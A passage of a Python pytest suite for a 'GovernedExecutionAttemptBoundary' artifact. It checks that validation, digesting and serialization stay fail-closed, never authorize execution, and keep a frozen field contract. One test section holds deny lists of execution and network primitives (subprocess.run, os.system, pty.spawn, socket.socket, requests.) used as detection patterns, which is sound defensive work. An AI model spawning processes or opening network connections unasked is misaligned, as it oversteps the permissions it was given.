        )
        assert a.network_authorized is False
        assert a.execution_available is False


# ═══════════════════════════════════════════════════════════════════════════
# 9. Verification error contract
# ═══════════════════════════════════════════════════════════════════════════

class TestVerificationErrorContract:
    """Assert validate() produces structured, fail-closed, non-executing errors."""

    def test_valid_artifact_returns_empty_issues(self):
        issues = GovernedExecutionAttemptBoundary().validate()
        assert issues == []

    def test_invalid_schema_returns_structured_error(self):
        issues = GovernedExecutionAttemptBoundary(schema_version="99.0").validate()
        assert len(issues) >= 1
        assert any("unknown schema_version" in i for i in issues)

    def test_invalid_state_returns_structured_error(self):
        issues = GovernedExecutionAttemptBoundary(attempt_state="launching").validate()
        assert any("invalid attempt_state" in i for i in issues)

    def test_future_state_returns_structured_error(self):
        issues = GovernedExecutionAttemptBoundary(
            attempt_state=GEA_EXECUTING_FUTURE,
        ).validate()
        assert any("future-only" in i for i in issues)

    def test_unsafe_auth_flag_returns_structured_error(self):
        issues = GovernedExecutionAttemptBoundary(execution_available=True).validate()
        assert any("execution_available must be False" in i for i in issues)

    def test_unsafe_safety_flag_returns_structured_error(self):
        issues = GovernedExecutionAttemptBoundary(no_execution=False).validate()
        assert any("no_execution must be True" in i for i in issues)

    def test_unknown_denial_reason_returns_structured_error(self):
        issues = GovernedExecutionAttemptBoundary(
            denial_reasons=["bogus_reason"],
        ).validate()
        assert any("unknown denial_reason" in i for i in issues)

    def test_multiple_issues_returned_together(self):
        a = GovernedExecutionAttemptBoundary(
            schema_version="99.0",
            attempt_state="launching",
            execution_available=True,
        )
        issues = a.validate()
        assert len(issues) >= 3

    def test_validate_never_triggers_execution(self):
        a = GovernedExecutionAttemptBoundary(execution_available=True)
        issues = a.validate()
        assert len(issues) > 0
        assert a.no_execution is True
        assert a.non_authorizing is True

    def test_validate_does_not_mutate_state(self):
        a = GovernedExecutionAttemptBoundary()
        state_before = a.attempt_state
        a.validate()
        assert a.attempt_state == state_before

    def test_validate_errors_are_non_authorizing(self):
        for flag_val in [
            {"execution_available": True},
            {"execution_authorized": True},
            {"push_authorized": True},
        ]:
            a = GovernedExecutionAttemptBoundary(**flag_val)
            issues = a.validate()
            assert len(issues) > 0
            # Error output doesn't imply authorization
            for issue in issues:
                assert "authorized" not in issue.lower() or "unauthorized" in issue.lower() or "must be False" in issue


# ═══════════════════════════════════════════════════════════════════════════
# 10. No-execution guards
# ═══════════════════════════════════════════════════════════════════════════

class TestNoExecutionGuards:
    """Assert no execution primitives in any trust path."""

    def _assert_no_exec_in_source(self, method):
        import inspect
        src = inspect.getsource(method)
        # Only flag actual execution calls, not field names like subprocess_authorized
        forbidden = ["subprocess.run", "subprocess.Popen", "os.system",
                     "Popen(", "spawn(", "pty.spawn",
                     "requests.", "urllib.request", "http.client",
                     "socket.socket"]
        for term in forbidden:
            assert term not in src, f"{method.__name__} contains '{term}'"

    def test_compute_digest_no_exec(self):
        self._assert_no_exec_in_source(GovernedExecutionAttemptBoundary.compute_digest)

    def test_validate_no_exec(self):
        self._assert_no_exec_in_source(GovernedExecutionAttemptBoundary.validate)

    def test_to_dict_no_exec(self):
        self._assert_no_exec_in_source(GovernedExecutionAttemptBoundary.to_dict)

    def test_to_dict_output_no_exec_commands(self):
        j = _json.dumps(GovernedExecutionAttemptBoundary().to_dict()).lower()
        forbidden = ["subprocess.run", "subprocess.popen", "os.system",
                     "pty.spawn", "exec(", "shell=true", "spawn"]
        for term in forbidden:
            assert term not in j, f"to_dict JSON contains '{term}'"

    def test_artifact_creation_never_executes(self):
        a = GovernedExecutionAttemptBoundary(
            attempt_state=GEA_BLOCKED_BY_NO_GO,
            hard_no_go_conditions=["test"],
            denial_reasons=[GEA_DENIED_NO_GO_PRESENT],
            missing_prerequisites=["p97", "approval"],
            failed_checks=["verification"],
        )
        assert a.no_execution is True
        assert a.execution_available is False
        assert a.non_authorizing is True

    def test_validation_never_executes(self):
        """Calling validate() on any state never triggers execution."""
        for state in sorted(VALID_GEA_STATES):
            a = GovernedExecutionAttemptBoundary(attempt_state=state)
            a.validate()
            assert a.no_execution is True, f"validate() with {state} must not execute"

    def test_digest_calculation_never_executes(self):
        a = GovernedExecutionAttemptBoundary(
            attempt_state=GEA_DENIED,
            denial_reasons=list(_ALL_26_DENIAL_REASONS),
        )
        a.compute_digest()
        assert a.no_execution is True

    def test_serialization_never_executes(self):
        a = GovernedExecutionAttemptBoundary()
        d = a.to_dict()
        j = _json.dumps(d, indent=2)
        assert len(j) > 0
        assert a.no_execution is True

    def test_all_trust_paths_no_exec(self):
        """Combined trust paths: create + validate + digest + serialize."""
        a = GovernedExecutionAttemptBoundary(
            attempt_state=GEA_BLOCKED_BY_FAILED_VERIFICATION,
            denial_reasons=[GEA_DENIED_FAILED_VERIFICATION],
            failed_checks=["verification_x"],
            hard_no_go_conditions=["unsafe"],
            missing_prerequisites=["p97"],
        )
        a.validate()
        a.digest = a.compute_digest()
        d = a.to_dict()
        j = _json.dumps(d)
        assert a.execution_available is False
        assert a.no_execution is True
        assert a.non_authorizing is True


# ═══════════════════════════════════════════════════════════════════════════
# 11. 99B contract preservation
# ═══════════════════════════════════════════════════════════════════════════

class Test99BContractPreservation:
    """Assert 99B frozen contract remains intact after trust hardening."""

    def test_33_fields_unchanged(self):
        d = GovernedExecutionAttemptBoundary().to_dict()
        assert len(d) == 33

    def test_14_valid_states_unchanged(self):
        assert len(VALID_GEA_STATES) == 14

    def test_26_denial_reasons_unchanged(self):
        assert len(VALID_GEA_DENIAL_REASONS) == 26

    def test_9_future_states_unchanged(self):
        assert len(UNAVAILABLE_GEA_STATES) == 9

    def test_12_auth_flags_all_false(self):
        a = GovernedExecutionAttemptBoundary()
        for flag in _12_AUTH_FLAGS:
            assert getattr(a, flag) is False

    def test_5_safety_flags_all_true(self):
        a = GovernedExecutionAttemptBoundary()
        for flag in _5_SAFETY_FLAGS:
            assert getattr(a, flag) is True

    def test_digest_is_sha256(self):
        dgst = GovernedExecutionAttemptBoundary().compute_digest()
        assert len(dgst) == 64

    def test_default_state_unavailable(self):
        assert GovernedExecutionAttemptBoundary().attempt_state == GEA_UNAVAILABLE

    def test_default_decision_denied(self):
        assert GovernedExecutionAttemptBoundary().attempt_decision == GEA_DENIED

    def test_no_new_required_fields(self):
        """No unexpected fields added to to_dict beyond the 33 frozen."""
        d = GovernedExecutionAttemptBoundary().to_dict()
        expected_keys = {
            "schema_version", "attempt_boundary_id", "phase_id", "task_id",
            "generated_at_utc", "attempt_state", "attempt_decision",
            "phase97_preflight_ref", "phase97_preflight_digest",
            "phase98_preflight_ref", "phase98_preflight_digest",
            "approval_ref", "audit_readiness_ref", "rollback_readiness_ref",
            "backend_contract_ref", "adapter_boundary_ref",
            "artifact_verification_ref", "no_go_review_ref",
            "execution_boundary_proof_ref",
            "hard_no_go_conditions", "missing_prerequisites", "failed_checks",
            "denial_reasons", "abort_reasons", "evidence_refs", "warnings",
            "authorization_summary",
            "simulation_only", "no_execution", "evidence_only",
            "non_authorizing", "design_only", "digest",
        }
        assert set(d.keys()) == expected_keys

    def test_schema_version_still_1_0(self):
        assert GovernedExecutionAttemptBoundary().schema_version == "1.0"

    def test_phase_id_still_99A(self):
        assert GovernedExecutionAttemptBoundary().phase_id == "99A"


# ═══════════════════════════════════════════════════════════════════════════
# 12. Phase 97/98 preflight preservation
# ═══════════════════════════════════════════════════════════════════════════

class TestPreflightContractPreservation:
    """Assert Phase 97/98 preflight contracts intact."""

    def test_phase97_ref_fields_present(self):
        d = GovernedExecutionAttemptBoundary().to_dict()
        assert "phase97_preflight_ref" in d
        assert "phase97_preflight_digest" in d

    def test_phase98_ref_fields_present(self):
        d = GovernedExecutionAttemptBoundary().to_dict()
        assert "phase98_preflight_ref" in d
        assert "phase98_preflight_digest" in d

    def test_phase97_refs_are_strings(self):
        a = GovernedExecutionAttemptBoundary()
        assert isinstance(a.phase97_preflight_ref, str)
        assert isinstance(a.phase97_preflight_digest, str)

    def test_phase98_refs_are_strings(self):
        a = GovernedExecutionAttemptBoundary()
        assert isinstance(a.phase98_preflight_ref, str)
        assert isinstance(a.phase98_preflight_digest, str)

    def test_preflight_refs_in_digest(self):
        base = _digest_for()
        assert _digest_for(phase97_preflight_ref="changed") != base
        assert _digest_for(phase97_preflight_digest="changed") != base
        assert _digest_for(phase98_preflight_ref="changed") != base
        assert _digest_for(phase98_preflight_digest="changed") != base

    def test_preflight_refs_dont_enable_execution(self):
        a = GovernedExecutionAttemptBoundary(
            phase97_preflight_ref="present",
            phase97_preflight_digest="abc",
            phase98_preflight_ref="present",
            phase98_preflight_digest="def",
        )
        assert a.execution_available is False
        assert a.no_execution is True


# ═══════════════════════════════════════════════════════════════════════════
# 13. Report trust preservation
# ═══════════════════════════════════════════════════════════════════════════

class TestReportTrustPreservation:
    """Assert report trust fields present in metadata and to_dict."""

    def test_report_notification_tests_importable(self):
        """Imports work — test suite discovery verifies existence."""
        from pcae.core.backend_invocations import (
            GovernedExecutionAttemptBoundary,
        )
        assert GovernedExecutionAttemptBoundary is not None

    def test_bootstrap_session_tests_discoverable(self):
        """Session test file exists."""
        from pathlib import Path
        session_test = Path(__file__).resolve().parent / "test_session.py"
        assert session_test.exists(), "test_session.py must exist"

    def test_to_dict_includes_all_trust_fields(self):
        d = GovernedExecutionAttemptBoundary().to_dict()
        trust_fields = [
            "schema_version", "attempt_state", "attempt_decision",
            "denial_reasons", "hard_no_go_conditions",
            "authorization_summary", "simulation_only", "no_execution",
            "evidence_only", "non_authorizing", "design_only", "digest",
        ]
        for field in trust_fields:
            assert field in d, f"trust field {field} missing from to_dict"

    def test_authorization_summary_covers_all_12_flags_in_to_dict(self):
        d = GovernedExecutionAttemptBoundary().to_dict()
        for flag in _12_AUTH_FLAGS:
            assert flag in d["authorization_summary"]
            assert d["authorization_summary"][flag] is False
